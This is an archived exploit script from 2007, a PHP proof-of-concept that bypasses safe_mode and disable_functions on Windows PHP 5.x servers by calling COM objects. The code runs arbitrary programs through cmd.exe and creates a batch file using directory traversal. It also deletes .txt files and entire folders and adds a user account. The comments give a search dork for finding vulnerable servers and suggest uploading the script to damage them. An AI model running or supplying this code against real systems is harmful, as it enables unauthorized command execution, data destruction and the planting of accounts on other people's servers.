<?php
//PHP 5.x COM functions safe_mode and disable_function bypass

//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//dork: intitle:phpinfo intext:"php version" +windows (thanks to rgod)

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//from: http://www.phpfreaks.com/phpmanual/page/ref.com.html

//Requirements:
//COM functions are only available for the Windows version of PHP.
//.Net support requires PHP 5 and the .Net runtime. 

//Installation:
//There is no installation needed to use these functions; they are part of the PHP core. -> (sounds good)
//The windows version of PHP has built in support for this extension. You do not need to
//load any additional extension in order to use these functions.
//You are responsible for installing support for the various COM objects that you intend
//to use (such as MS Word); we don't and can't bundle all of those with PHP.

//mmm... I don't know how many people use Apache and PHP on Windows servers but I suppose there are
//a lot of users if PHP developers decide to implement COM functions as part of PHP core.
//take a look here: intitle:phpinfo intext:"php version" +windows (thanks to rgod).
//Anyway, I think they should take much care on security due to the fact that, through these
//functions, you can seriously compromise a pc.

//For remote execution you need (naturally) to use a server that is MS based,
//e.g. Apache for win configured for working with PHP.
//In this scenario, someone could upload a script and then use it to damnage the server.

//Local execution simply bypass all Windows protections against execution of dangerous
//COM objects (even kill-bit) due to the fact that the script is executed from a client that
//does not check these settings.

//php.ini settings:
//safe_mode = On
//disable_functions = com_load_typelib
//open_basedir = htdocs

//Remote execution requires that open_basedir is disabled

$mPath = str_repeat("..\\",20);

$compatUI = new COM('{0355854A-7F23-47E2-B7C3-97EE8DD42CD8}');	//this one uses compatUI.dll
$compatUI->RunApplication("something", "notepad.exe", 1);	//to run notepad.exe

$wscript = new COM('wscript.shell');				//this one uses wscript.exe
$wscript->Run("cmd.exe /c calc.exe");				//to run calc.exe

$FSO = new COM('Scripting.FileSystemObject');			//this one uses wshom.ocx
$FSO->OpenTextFile($mPath."something.bat", 8, true);		//to create a batch file on server... yes,
																//if you want you can write to this batch file :)

$FSOdelFile = new COM('Scripting.FileSystemObject');		//this one uses wshom.ocx
$FSOdelFile->DeleteFile($mPath."PathToFiles\\*.txt", True);	//to delete all files with txt extension

$FSOdelFolder = new COM('Scripting.FileSystemObject');		//this one uses wshom.ocx
$FSOdelFolder->DeleteFolder($mPath."FolderToDelete", True);	//to delete an entire folder

$shgina = new COM('{60664CAF-AF0D-0004-A300-5C7D25FF22A0}');	//this one uses shgina.dll
$shgina->Create("shinnai");					//to add an user :)
?>

# milw0rm.com [2007-10-22]
